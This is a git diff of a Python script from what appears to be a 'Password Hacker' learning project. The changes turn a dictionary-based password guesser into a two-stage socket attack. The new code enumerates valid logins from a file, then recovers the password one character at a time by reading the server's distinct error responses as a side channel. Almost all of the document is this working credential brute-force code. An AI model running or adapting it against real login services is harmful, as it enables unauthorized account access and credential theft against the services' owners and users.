@@ -1,11 +1,19 @@
 from argparse import ArgumentParser
 from dataclasses import dataclass
-from itertools import product
+from json import dumps, loads
 from socket import socket
-from sys import stderr
+from string import ascii_letters, digits
 
-FILE = (r'C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)'
-        r'\passwords.txt')
+LOGINS = (r'C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)'
+          r'\logins.txt')
+
+ALPHABET = ascii_letters + digits
+
+WRONG_LOGIN = {'result': 'Wrong login!'}
+WRONG_PASSWORD = {'result': 'Wrong password!'}
+BAD_REQUEST = {'result': 'Bad request!'}
+EXCEPTION = {'result': 'Exception happened during login'}
+SUCCESS = {'result': 'Connection success!'}
 
 
 @dataclass(slots=True)
@@ -21,31 +29,49 @@ class Config:
         self.address = args.ip, args.port
 
 
-def get_passwords():
-    with open(FILE) as f:
-        for line in f:
-            password = line.strip()
+class Credentials(dict):
+    def __init__(self, login: str, password: str):
+        super().__init__({'login': login, 'password': password})
 
-            all_cases = ((c.lower(), c.upper()) if c.isalpha() else (c,)
-                         for c in password)
-            all_cases = product(*all_cases)
-            all_cases = map(''.join, all_cases)
-
-            yield from all_cases
+    def to_json(self, indent=None):
+        return dumps(self, indent=indent)
 
 
-def brute_force(client):
-    for candidate in get_passwords():
-        client.send(candidate.encode())
+def get_logins():
+    with open(LOGINS) as f:
+        logins = (line.strip() for line in f)
+        yield from logins
+
+
+def brute_force_login(client):
+    for login in get_logins():
+        credentials = Credentials(login, ' ')
+
+        client.send(credentials.to_json().encode())
         response = client.recv(1024).decode()
+        response = loads(response)
 
-        match response:
-            case 'Connection success!':
-                print(candidate)
+        if response == WRONG_PASSWORD:
+            return login
+
+
+def brute_force_password(client, login):
+    password = []
+    found = False
+    while not found:
+        for character in ALPHABET:
+            candidate = ''.join(password) + character
+            credentials = Credentials(login, candidate)
+
+            client.send(credentials.to_json().encode())
+            response = client.recv(1024).decode()
+            response = loads(response)
+
+            if response == EXCEPTION:
+                password.append(character)
                 break
-            case 'Too many attempts.' as s:
-                print(f'Error! Server response: {s}', file=stderr)
-                break
+            elif response == SUCCESS:
+                return candidate
 
 
 def main():
@@ -54,7 +80,10 @@ def main():
     with socket() as client:
         client.connect(config.address)
 
-        brute_force(client)
+        login = brute_force_login(client)
+        password = brute_force_password(client, login)
+
+    print(dumps(dict(login=login, password=password)))
 
 
 if __name__ == "__main__":
